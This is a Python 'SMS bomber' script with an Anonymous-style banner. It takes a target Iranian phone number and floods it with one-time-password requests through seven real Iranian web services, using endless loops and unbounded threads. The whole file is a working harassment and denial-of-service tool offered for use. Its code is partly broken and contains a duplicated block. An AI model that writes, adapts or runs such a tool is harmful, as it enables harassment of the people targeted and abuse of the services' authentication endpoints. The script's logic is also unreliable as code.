import requests , os , threading , time

os.system('cls' if os.name == 'nt' else 'clear')
banner = '''
███████╗███╗   ███╗███████╗      ██████╗  ██████╗ ███╗   ███╗██████╗ ███████╗██████╗ 
██╔════╝████╗ ████║██╔════╝      ██╔══██╗██╔═══██╗████╗ ████║██╔══██╗██╔════╝██╔══██╗
███████╗██╔████╔██║███████╗█████╗██████╔╝██║   ██║██╔████╔██║██████╔╝█████╗  ██████╔╝
╚════██║██║╚██╔╝██║╚════██║╚════╝██╔══██╗██║   ██║██║╚██╔╝██║██╔══██╗██╔══╝  ██╔══██╗
███████║██║ ╚═╝ ██║███████║      ██████╔╝╚██████╔╝██║ ╚═╝ ██║██████╔╝███████╗██║  ██║
╚══════╝╚═╝     ╚═╝╚══════╝      ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═════╝ ╚══════╝╚═╝  ╚═╝

Yasin BM
                                                                                     '''
print(banner)
print("CREATE BY YASIN BM ... WE ARE ANONYMOUSE")
target = input("Enter target phone number with out +98 : ")

url = "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp"
url2 = "https://auth.basalam.com/otp-request"
url3 = "https://www.miare.ir/api/otp/driver/request/"
url4 = "https://gateway.telewebion.com/shenaseh/api/v2/auth/step-one"
url5 = "https://sso.varzesh3.com/account/login?ReturnUrl=/connect/authorize/callback?client_id=0D996589651C4235B7D40837E8C1DBC2F60410B2C9304298B568&redirect_uri=https%3A%2F%2Fwww.varzesh3.com%2Foidc%2Fcallback&response_type=code&scope=openid%20profile%20offline_access%20videos.api%20comments.api%20profile.api%20world-cup.prediction.api%20engagement.api%20notification.api&state=109e9ab5b7884fad9ea691e7050cb178&code_challenge=IAabQgNkPAziQXexg0a8bUB9ttApqtqGvNN8ESaDsU8&code_challenge_method=S256&response_mode=query"
url6 = "https://www.aparat.com/api/fa/v1/user/Authenticate/country_code?callbackType=postmes"
url7 = "https://panel.eways.co/User/CheckValidationMobileCode"

def a():
    while True:
        number = {"cellphone":target}
        requests.post(url,data=number)
        print(f"Bombering this number {target} ====> ")
def b():
    while True:
        number2 = {"mobile":target}
        requests.post(url2,data=number2)
        print(f"Bombering this number {target} ====> ")
def c():
    while True:
        number3 = {"phone_mobile":target}
        requests.post(url3,data=number3)
        print(f"Bombering this number {target} ====> ")
def d():
    while True:
        number4 = {"phone":target}
        requests.post(url4,data=number4)
        print(f"Bombering this number {target} ====> ")
def e():
    while True:
        number5 = {"PhoneNumber":target}
        requests.post(url5,data=number5)
        print(f"Bombering this number {target} ====> ")
def f():
    while True:
        number6 = number2 = {"mobile":target}
        requests.post(url6,data=number6)
def g():
    while True:
        number7 = {"mobileNo":target}
        requests.post(url7,data=number7)
        print(f"Bombering this number {target} ====> ")
    
while True:
    t = threading.Thread(target=b)
    t.start()

while True:
    t = threading.Thread(target=c)
    t.start()
while True:
    t = threading.Thread(target=d)
    t.start()

while True:
    t = threading.Thread(target=e)
    t.start()

while True:
    t = threading.Thread(target=f)
    t.start()

while True:
    t = threading.Thread(target=g)
    t.start()

time.sleep(10)

def a():
    while True:
        number = {"cellphone":target}
        requests.post(url,data=number)
        print(f"Bombering this number {target} ====> ")
def b():
    while True:
        number2 = {"mobile":target}
        requests.post(url2,data=number2)
        print(f"Bombering this number {target} ====> ")
def c():
    while True:
        number3 = {"phone_mobile":target}
        requests.post(url3,data=number3)
        print(f"Bombering this number {target} ====> ")
def d():
    while True:
        number4 = {"phone":target}
        requests.post(url4,data=number4)
        print(f"Bombering this number {target} ====> ")
def e():
    while True:
        number5 = {"PhoneNumber":target}
        requests.post(url5,data=number5)
        print(f"Bombering this number {target} ====> ")
def f():
    while True:
        number6 = number2 = {"mobile":target}
        requests.post(url6,data=number6)
def g():
    while True:
        number7 = {"mobileNo":target}
        requests.post(url7,data=number7)
        print(f"Bombering this number {target} ====> ")
    
while True:
    t = threading.Thread(target=b)
    t.start()

while True:
    t = threading.Thread(target=c)
    t.start()
while True:
    t = threading.Thread(target=d)
    t.start()

while True:
    t = threading.Thread(target=e)
    t.start()

while True:
    t = threading.Thread(target=f)
    t.start()

while True:
    t = threading.Thread(target=g)
    t.start()


















    

